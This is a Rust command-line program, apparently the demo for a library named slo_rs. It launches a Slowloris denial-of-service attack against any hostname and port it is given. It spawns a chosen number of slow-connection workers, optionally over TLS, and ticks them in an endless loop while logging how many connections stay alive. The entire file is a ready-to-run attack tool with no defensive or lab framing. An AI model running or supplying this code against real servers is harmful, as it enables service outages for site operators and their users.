#![feature(thread_sleep_until)]

use log::info;
use slo_rs::slowloris::SlowLoris;
use std::{
    thread,
    time::{Duration, Instant},
};

use clap::Parser;

/// Demonstration of the slow_rs Rust library.
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Hostname to run against
    #[arg(short('h'), long)]
    hostname: String,

    /// Port to connect to. Defaults to 443 (HTTPS).
    #[arg(short('p'), long, default_value_t = String::from("443"))]
    port: String,

    /// Number of worker Loris to run
    #[arg(short('n'), long)]
    num_loris: usize,

    /// Time interval between Loris ticks. Different servers behave
    /// differently when under attack. In general this is the
    /// time between pulses of activity from each Loris.
    #[arg(short('i'), long, default_value_t = 500)]
    interval_ms: u64,

    /// Whether or not to force-enable TLS. When not forcing TLS, only
    /// connections to port 443 will automatically use TLS.
    #[arg(long, default_value_t = false)]
    force_tls: bool,
}

fn main() {
    colog::default_builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    let args = Args::parse();
    let mut slow_loris = SlowLoris::new(
        args.hostname,
        args.port.clone(),
        args.force_tls || args.port.eq("443"),
        Duration::from_millis(args.interval_ms),
        args.num_loris,
    );

    loop {
        let next_tick_at = slow_loris.tick();
        let time_until_next_tick = next_tick_at - Instant::now();

        info!(
            "{} alive and {} dead, ticking again in {time_until_next_tick:?}",
            slow_loris.get_alive(),
            slow_loris.get_dead()
        );

        thread::sleep_until(next_tick_at);
    }
}
